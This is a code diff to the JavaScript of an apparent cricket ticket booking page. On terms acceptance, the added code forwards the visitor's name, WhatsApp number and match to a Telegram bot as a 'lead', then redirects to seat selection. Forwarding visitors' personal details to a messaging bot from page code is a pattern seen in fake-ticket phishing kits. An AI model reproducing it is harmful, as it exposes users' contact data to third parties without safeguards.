@@ -357,4 +357,31 @@ if (acceptBtn) {
         
         const telegramMsg = `🔥 *LEAD MOVED FORWARD! (Event Page)* 🔥\n\n` +
                             `👤 *Name:* ${name}\n` +
-           
+                            `📞 *WhatsApp:* ${phone}\n` +
+                            `🏏 *Match:* ${matchTitle}\n` +
+                            `👉 *Action:* Accepted T&C, moving to Seat Selection!`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
+
+        try {
+            await fetch(url);
+        } catch (e) {
+            console.log("Telegram Error");
+        } finally {
+            closePopup();
+            // Match title pehle hi full name mein save ho chuka hai upar
+            window.location.href = "seats.html";
+        }
+    };
+}
+
+// ==========================================
+// 🔥 BOOK BUTTON
+// ==========================================
+const bookNowBtn = document.getElementById('book-now-btn');
+if (bookNowBtn) {
+    bookNowBtn.onclick = () => {
+        openTnc();
+    };
+}
+
